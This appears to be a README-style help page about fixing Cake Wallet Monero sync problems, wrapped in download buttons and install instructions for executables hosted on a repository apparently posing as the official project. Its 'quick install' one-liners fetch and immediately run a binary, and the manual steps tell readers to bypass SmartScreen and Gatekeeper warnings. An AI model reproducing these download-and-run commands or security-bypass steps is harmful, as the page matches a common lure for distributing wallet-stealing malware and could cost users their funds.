![Cake Wallet monero sync guide](assets/cake-wallet-monero-sync-article-banner.png)

# Fix Cake Wallet Monero Sync Problems

Slow, stuck or restarting: how to tell which one you have.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

A first Monero sync is slow by nature; a sync that stops moving is a connection or node problem; a sync that restarts from zero is usually the app being closed or the wallet recreated. Install the current build, check the node, and only rescan when the sync completes but the history is wrong.

<!-- ARTICLE-BODY-BEGIN -->

## Start from the current release
Install the current build over your existing one before diagnosing anything else. Sync behaviour depends on the wallet code reading the chain correctly, and a build that is behind can stall on data it does not understand.

Keep the wallet: an update does not remove funds. If you are unsure whether your copy is current, the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> names the version at the top of the page, and installing it costs a minute.

## Check the node first
A Monero wallet reads the chain through a node. If the node is unreachable, the app sits on "attempting sync" without progress, and no amount of waiting fixes it. Switch to another node, or add your own, then watch whether the block count moves.

The node is also a privacy choice: a remote node sees the requests your wallet makes. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-change-node.md">Change the node in Cake Wallet</a> covers how to switch and why a node that works for Bitcoin may not serve Monero well.

## Slow is not stuck
A first sync reads every block since the restore height, so it can take hours on a phone and much longer on a slow connection. The app shows a remaining-block count while it works; a number that decreases is progress, even when it feels glacial.

Keeping the app open and in the foreground is the simplest way to avoid interruptions on mobile. Restarting the app does not corrupt anything, but it does throw away the work in progress, which is why a sync can look like it starts over.

## When the chain data is wrong
If the block count reaches zero and a transaction you know about is still missing, the wallet's local history is wrong rather than incomplete. A rescan re-reads from the restore height and rebuilds it, which is the correct fix and also the slowest one.

A wrong restore height is the usual reason a rescan takes far longer than expected or misses early transactions. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-rescan.md">Rescan the Monero blockchain</a> explains the trade-off, and when a fresh restore beats a rescan.

## Confirm what you should see
Before you treat a zero balance as a sync failure, check whether the funds should be there at all: right account open, transaction confirmed, address correct. Those three cover most cases that look like sync problems and are not.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Cake Wallet funds not appearing</a> orders those checks so you do not rescan a healthy wallet. Sync is expensive to redo, and the order of diagnosis is what keeps it cheap.

## Quick triage
| Symptom | Cause | Fix |
| --- | --- | --- |
| Block count frozen | The node stopped answering | Switch or add a node |
| Sync restarts from zero | The app was closed, or the wallet recreated | Keep it open and let it finish |
| Sync completes, history still wrong | The local history is stale | Rescan from the correct height |

If none of that moves the counter, <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">download and run the current release</a> before you spend hours on a second rescan.

## FAQ
### How long does a Monero sync take?
A first sync from a recent restore height can take under an hour on a good connection; from an old height it can take many hours.
### Must the app stay open?
On mobile, keep it in the foreground for the first sync. Background limits interrupt the work and it resumes later.
### Why does the sync restart from the beginning?
The app was closed, restarted or the wallet was recreated, so the in-memory progress was lost, or the wallet's restore height changed.
### Is Cake Wallet faster than other Monero wallets?
Speed depends on the node and the restore height more than on the app. There is no verified cross-wallet benchmark to quote.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[change the node in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-change-node.md) · [rescan the Monero blockchain](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-rescan.md) · [Cake Wallet funds not appearing](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
